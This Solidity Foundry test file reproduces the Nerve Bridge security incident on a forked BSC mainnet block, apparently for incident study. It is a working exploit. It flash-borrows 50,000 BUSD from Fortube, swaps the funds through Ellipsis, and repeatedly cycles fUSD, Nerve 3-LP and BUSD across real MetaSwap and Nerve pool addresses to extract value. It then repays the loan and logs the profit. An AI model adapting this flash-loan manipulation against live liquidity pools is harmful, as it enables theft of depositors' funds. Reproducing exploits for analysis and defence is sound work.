// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// tx: https://bscscan.com/tx/0xea95925eb0438e04d0d81dc270a99ca9fa18b94ca8c6e34272fc9e09266fcf1d
// analysis: https://blocksecteam.medium.com/the-analysis-of-nerve-bridge-security-incident-ead361a21025

interface IFortube {
    function flashloan(address receiver, address token, uint256 amount, bytes memory params) external;
}

interface ISaddle {
    function swap(uint8 i, uint8 j, uint256 dx, uint256 min_dy, uint256 deadline) external returns (uint256);

    function swapUnderlying(
        uint8 tokenIndexFrom,
        uint8 tokenIndexTo,
        uint256 dx,
        uint256 minDy,
        uint256 deadline
    ) external returns (uint256);
}

interface ISwap {
    function removeLiquidityOneToken(
        uint256 tokenAmount,
        uint8 tokenIndex,
        uint256 minAmount,
        uint256 deadline
    ) external returns (uint256);
}

contract ContractTest is Test {
    uint256 mainnetFork;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IFortube flashloanProvider = IFortube(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672);
    address nerve3lp = 0xf2511b5E4FB0e5E2d123004b672BA14850478C14;
    address busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address fusd = 0x049d68029688eAbF473097a2fC38ef61633A3C7A;
    address fusdPool = 0x556ea0b4c06D043806859c9490072FaadC104b63;
    address metaSwapPool = 0xd0fBF0A224563D5fFc8A57e4fdA6Ae080EbCf3D3;
    address nerve3pool = 0x1B3771a66ee31180906972580adE9b81AFc5fCDc;

    function setUp() public {
        mainnetFork = vm.createFork("bsc", 12_653_565);
        vm.selectFork(mainnetFork);
        cheats.label(address(flashloanProvider), "flashloanProvider");
    }

    function testExp() public {
        // 1. flashloan 50000 busd from fortube
        flashloanProvider.flashloan(address(this), busd, 50_000 ether, "0x");
        console.log("final busd profit: ", IERC20(busd).balanceOf(address(this)) / 10 ** IERC20(busd).decimals());
    }

    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) external {
        IERC20(busd).approve(fusdPool, type(uint256).max);
        IERC20(fusd).approve(metaSwapPool, type(uint256).max);
        IERC20(nerve3lp).approve(nerve3pool, type(uint256).max);
        IERC20(busd).approve(metaSwapPool, type(uint256).max);

        // 2. swap from 50000 busd to fusd on Ellipsis
        IERC20(fusd).approve(fusdPool, type(uint256).max);
        IcurveYSwap(fusdPool).exchange_underlying(1, 0, IERC20(busd).balanceOf(address(this)), 1);

        for (uint8 i = 0; i < 7; i++) {
            swap();
        }

        // 6. swap from fusd to busd on Ellipsis
        IcurveYSwap(fusdPool).exchange_underlying(0, 1, IERC20(fusd).balanceOf(address(this)), 1);

        // 7. payback flashloan
        IERC20(busd).transfer(address(0xc78248D676DeBB4597e88071D3d889eCA70E5469), amount + fee);
    }

    function swap() public {
        // 3. swap from fusd to Nerve 3-LP token on metaSwapPool
        ISaddle(metaSwapPool).swap(0, 1, IERC20(fusd).balanceOf(address(this)), 1, block.timestamp);

        // 4. remove liquidity Nerve.3pool with lp tokens to remove the liquidity of BUSD
        ISwap(nerve3pool).removeLiquidityOneToken(IERC20(nerve3lp).balanceOf(address(this)), 0, 1, block.timestamp);

        // 5. invoking the swapUnderlying function of MetaSwap to swap BUSD for fUSDT
        ISaddle(metaSwapPool).swapUnderlying(1, 0, IERC20(busd).balanceOf(address(this)), 1, block.timestamp);
    }
}
